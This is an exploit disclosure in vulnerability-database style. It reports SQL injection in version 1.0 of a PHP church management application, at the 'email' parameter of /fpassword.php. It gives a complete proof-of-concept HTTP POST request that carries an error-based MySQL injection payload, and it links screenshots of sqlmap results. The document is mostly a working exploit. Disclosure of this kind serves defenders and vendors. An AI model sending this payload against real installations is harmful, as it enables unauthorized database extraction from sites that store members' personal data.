### Exploit Title: Best church management software - SQL-injections 
### Date: 2025-02/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17856/best-church-management-software-free-download-full-version.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./fpassword.php SQL injection exists for parameter email

### Sample request POC #1

```
POST /fpassword.php HTTP/1.1
Host: localhost:8001
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

submit=1&email='+AND+GTID_SUBSET(CONCAT(0x716a6b6a71%2C(SELECT+(ELT(3732%3D3732%2C1)))%2C0x716b7a7671)%2C3732)--+meD
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739238772979.jpg "Best church management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739238715998.jpg "Best church management software")
